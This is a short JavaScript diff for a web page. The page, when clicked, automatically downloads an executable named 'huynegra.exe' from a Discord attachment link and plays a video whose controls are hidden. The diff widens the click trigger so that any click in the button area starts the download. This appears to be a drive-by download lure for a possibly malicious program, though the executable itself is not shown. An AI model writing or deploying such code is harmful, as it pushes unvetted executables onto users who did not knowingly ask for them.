@@ -19,15 +19,13 @@ function downloadFile() {
     link.href = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe";
     link.download = "huynegra.exe";
     link.click();
+
+    var video = document.getElementById("video");
+    video.play();
 }
 
 var buttonContainer = document.getElementById("button-container");
-buttonContainer.addEventListener("click", function(event) {
-    if (event.target === buttonContainer) {
-        downloadFile();
-        video.play();
-    }
-});
+buttonContainer.addEventListener("click", downloadFile);
 
 var video = document.getElementById("video");
 video.controls = false;
